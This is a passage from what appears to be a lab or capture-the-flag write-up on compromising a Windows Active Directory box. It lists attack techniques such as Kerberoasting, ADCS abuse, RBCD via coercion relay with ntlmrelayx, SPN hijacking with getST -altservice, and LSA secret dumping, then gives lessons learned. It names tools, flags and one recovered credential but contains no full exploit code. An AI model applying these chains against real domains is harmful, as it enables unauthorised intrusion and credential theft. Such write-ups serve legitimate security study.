  (`netexec --gmsa`)
- Chisel reverse-SOCKS pivoting into an internal-only subnet as a ligolo-ng
  fallback
- Kerberoasting and structured offline cracking (multiple wordlist/rule
  strategies, CPU-bound exhaustion as a real, citable stopping point)
- ADCS ESC1-15 sweep and empirical (not inferred) noPac/Certifried
  patch-status testing
- ADFS DKM container extraction via LDAP
- RBCD written via coercion + `ntlmrelayx --remove-mic` against a target
  with no pre-existing ACL edge
- `ForceChangePassword` abuse via `bloodyAD`
- SPN hijack + `impacket-getST -altservice` sname rewrite to escalate a
  narrowly-scoped constrained-delegation grant to a different host
- LSA secret dumping for cross-account plaintext recovery (`secretsdump`'s
  `DefaultPassword`)

## Lessons Learned

- **A cheap, standard, early-checklist item can sit unfound for a long
  time if the flashier vectors get tried first.** Kerberoasting, ADCS, a
  full BloodHound ACL sweep, and a coercion→relay chain against DC01 were
  all thoroughly exhausted before anyone checked `userAccountControl` for
  `PASSWD_NOTREQD` on the domain's computer objects — a single LDAP query
  plus one Kerberos round-trip per candidate. That check ended up being
  the actual initial-access credential the whole rest of the chain was
  built on. The fix isn't "check harder" — it's ordering a checklist by
  cost and actually working it top-to-bottom, not saving the cheapest item
  for after everything expensive has failed. Generalized in
  [[windows-active-directory-attack-surface-checklist]] and
  [[pre2k-default-computer-account-passwords]].
- **A group holding a strong AD read/write primitive (`ReadGMSAPassword`,
  here) is only as strong as its weakest member.** Correctly-scoped gMSA
  read rights, restricted to a single non-default group, were undermined
  entirely by that group's sole member being a forgotten, never-joined
  computer account with a guessable default password — the primitive
  itself was never misconfigured, the account sitting behind it was.
- **RBCD doesn't require a pre-existing ACL edge if the target is
  coercible and its SMB server doesn't enforce signing.** Every computer
  object's default SELF write on its own delegation attribute is enough,
  once its own authentication is captured via coercion and relayed. Worth
  checking this even against a domain where a straightforward ACL sweep
  for RBCD-writable targets comes back empty, as it did here.
- **The same CVE-2019-1040 (`--remove-mic`) bypass can be live on one
  machine and dead on another with the identical OS build number.**
  DC01 and WEB01 are both Server 2019 build 17763, but the bypass fails on
  DC01 and succeeds cleanly on WEB01 — most likely because the underlying
  mitigation is GPO/registry-configurable, not purely a binary patch.
  Test per machine, not per patch baseline.
- **A relay behind a NAT hop needs a genuinely long observation window.**
  A `<60s` capture is not proof a coercion callback failed to arrive — it
  can take well over a minute through Hyper-V-style NAT, and a short
  window here produces a confident, wrong "no route" conclusion.
- **S4U2Proxy's delegation check is a string match against an SPN, not an
  ownership check on the computer object that SPN currently belongs to.**
  Combined with a Kerberos ticket's `sname` sitting outside the encrypted
  portion of the ticket and being freely client-rewritable, a narrowly-
  scoped delegation grant can be escalated to reach a completely different
  target the delegation was never nominally authorized for — as long as
  the SPN string itself can be moved.
- **Being honest about where independent derivation ends and published
  research begins matters more than which specific step it was.** The
  credential that unlocked the DC01 foothold (`MS01$:ms01`, via
  `PASSWD_NOTREQD` reasoning) was independently derived — it just took
  longer than it should have, per the point above. What genuinely needed
  a lookup of published research, after independent effort had genuinely
  stalled, was the second half of the chain: writing RBCD onto WEB01 via a
  self-targeted coercion relay, and escalating `a.white_adm`'s narrow
  WEB01-only delegation grant to DC01 via the SPN-move/`-altservice`
  trick. Both are re-derived and re-verified live against this box's own
  instance here — but the techniques themselves came from outside, and
  blurring that distinction would be less useful to the next reader, not
  more impressive.

See also: [[windows-active-directory-attack-surface-checklist]],
[[pre2k-default-computer-account-passwords]],
[[rbcd-via-coercion-relay]], [[s4u2proxy-spn-hijack-altservice-ticket]].
